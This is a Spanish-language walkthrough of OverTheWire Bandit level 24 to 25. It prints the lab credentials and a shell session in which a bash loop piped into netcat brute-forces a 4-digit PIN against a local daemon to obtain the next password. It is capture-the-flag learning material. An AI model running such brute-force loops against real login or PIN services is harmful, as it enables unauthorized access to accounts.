# Level 24 al 25

## Objetivos
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time
## datos de acceso
bandit24
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
## Solucion
```bash
bandit24@bandit:~$ nc -v localhost 3002
nc: connect to localhost (127.0.0.1) port 3002 (tcp) failed: Connection refused
bandit24@bandit:~$ nc -v localhost 3002
nc: connect to localhost (127.0.0.1) port 3002 (tcp) failed: Connection refused
bandit24@bandit:~$ nc -v localhost 3002
nc: connect to localhost (127.0.0.1) port 3002 (tcp) failed: Connection refused
bandit24@bandit:~$ nc -v localhost 30002
Connection to localhost (127.0.0.1) 30002 port [tcp/*] succeeded!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 123
Wrong! Please enter the correct pincode. Try again.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 987
bandit24@bandit:~$ for i in {0000..0003}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v
Usage: grep [OPTION]... PATTERNS [FILE]...
Try 'grep --help' for more information.
bandit24@bandit:~$ for i in {0000..0003}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.

Timeout. Exiting.
bandit24@bandit:~$
bandit24@bandit:~$ for i in {0000..0003}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
Timeout. Exiting.
bandit24@bandit:~$ VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar: command not found
bandit24@bandit:~$ VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar: command not found
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:~$

```

## Notas adicionales
Creamos un for para encontrar la contraseña
## Referencias
